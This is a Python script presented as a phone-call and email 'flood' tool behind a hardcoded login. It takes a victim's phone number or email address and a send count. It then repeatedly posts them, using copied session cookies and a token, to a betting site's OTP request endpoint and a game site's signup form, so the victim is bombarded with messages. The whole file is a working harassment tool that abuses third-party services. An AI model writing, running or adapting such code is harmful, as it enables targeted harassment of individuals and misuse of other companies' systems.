import threading
import os,sys
import time

try:
        import requests
except ImportError:
        os.system("pip install requests")

banner_login = """\033[00m
        ░█─── ░█▀▀▀█ ░█▀▀█ ▀█▀ ░█▄─░█ 
        ░█─── ░█──░█ ░█─▄▄ ░█─ ░█░█░█ 
        ░█▄▄█ ░█▄▄▄█ ░█▄▄█ ▄█▄ ░█──▀█
                 \033[32mScript FLOOD SMS AND EMAIL\033[00m

    \033[31m_____________________________________________________\033[00m
"""

banner_home = """
     ░██████╗██╗░░██╗░█████╗░██████╗░
     ██╔════╝██║░░██║██╔══██╗██╔══██╗
     ╚█████╗░███████║██║░░██║██████╔╝
     ░╚═══██╗██╔══██║██║░░██║██╔═══╝░
     ██████╔╝██║░░██║╚█████╔╝██║░░░░░
     ╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░
                   GENIX SHOP AUTHOR SCRIPT DEOBF BYNICEDAY
"""

def callflood():
        print()
        try:
                target = input("      \033[31m[\033[00m+\033[31m] \033[32mPHONE-NUMBER\033[00m  : \033[36m")
                jam = int(input("      \033[31m[\033[00m+\033[31m] \033[32mNUMBER OF SEND\033[00m: \033[36m"))
                print()
        except:
                print()
                print("          \033[31mERROR INPUT THE NUMBER INCORRECT !\033[00m")
                time.sleep(1.20)
                main_process()

        def run(phone):
                try:
                        for i in range(1, jam+1):
                                req = requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone[1:]}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"})
                                print(f"      \033[35m   CALL SEND TO \033[31m{phone} \033[33mTHREADS \033[00m: {i}")
                                time.sleep(80)
                except:
                        pass

        threading.Thread(target=run, args=[target]).start()

def emailflood():
        print()
        try:
                address = input("      \033[31m[\033[00m+\033[31m] \033[32mEMAIL ADDRESS\033[00m : \033[36m")
                amount = int(input("      \033[31m[\033[00m+\033[31m] \033[32mNUMBER OF SEND\033[00m: \033[36m"))
                print()
        except:
                print()
                print("          \033[31mERROR INPUT THE NUMBER INCORRECT !\033[00m")
                time.sleep(1.20)
                main_process()

        def run(email):
                try:
                        for i in range(1, amount+1):
                                req = requests.post("https://au.moveongame.com/member/joinemaildo.php",headers={"cookie": "_gcl_au=1.1.1376046456.1681996535;_gid=GA1.2.1733753910.1681996536;PHPSESSID=450ui60b2it2qmk7evid54shoe;_gat_gtag_UA_135083014_2=1;_ga_PBYDNCGKP0=GS1.1.1682000010.2.1.1682000016.54.0.0;_ga=GA1.2.822109445.1681996536","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},data=f"signup-email={email}")
                                if (req.status_code == 200):
                                        print(f"      \033[35m   SPAM SEND TO \033[31m{address} \033[33mTHREADS \033[00m: {i}")
                except:
                        pass

        threading.Thread(target=run, args=[address]).start()


def main_process():
        os.system("clear")
        print(banner_home)
        print("   \033[36mSLECET THE OPTIONS \033[00m:")
        print()
        print("        \033[31m[\033[00m1\033[31m] \033[32mEMAIL FLOOD")
        print("        \033[31m[\033[00m2\033[31m] \033[32mCALL FLOOD")
        print("        \033[31m[\033[00m3\033[31m] \033[32mSPAMSMS FLOOD\033[00m")
        print()
        choice = input("    \033[31m[\033[00m*\033[31m] \033[34mCHOICE\033[00m : ")
        print()

        if (choice == "1" or choice == "01"):
                emailflood()
        elif (choice == "2" or choice == "02"):
                callflood()
        elif (choice == "3" or choice == "03"):
                print("            \033[31mERROR INPUT THIS FUNCTIONS NO SERVICE !\033[00m")
                time.sleep(1)
                main_process()
        else:
                print("                \033[31mERROR INPUT NOT FOUND !\033[00m")
                time.sleep(1)
                main_process()


def login():
        os.system("clear")
        print(banner_login)
        username = input("                  \033[36mUsername\033[00m : \033[31m")
        password = input("                  \033[36mPassword\033[00m : \033[31m")
        print("    \033[31m_____________________________________________________\033[00m")
        print()
        print("                    \033[33mPLEASE WAIT FOR LOGIN...\033[00m")
        time.sleep(1)

        if (username == "" or password == ""):
                print()
                print("             \033[31mERROR INPUT THE PASSWORD OR USERNAME !\033[00m")
                time.sleep(2)
                login()
        elif (username == "android" and password == "123456789"):
                print()
                print("                 \033[32mINPUT LOGGED IN SUCCESSFULLY !\033[00m")
                time.sleep(1.50)
                main_process()
        else:
                print()
                print("          \033[31mERROR INPUT USERNAME OR PASSWORD INCURRECT !\033[00m")
                time.sleep(3)
                login()


login()
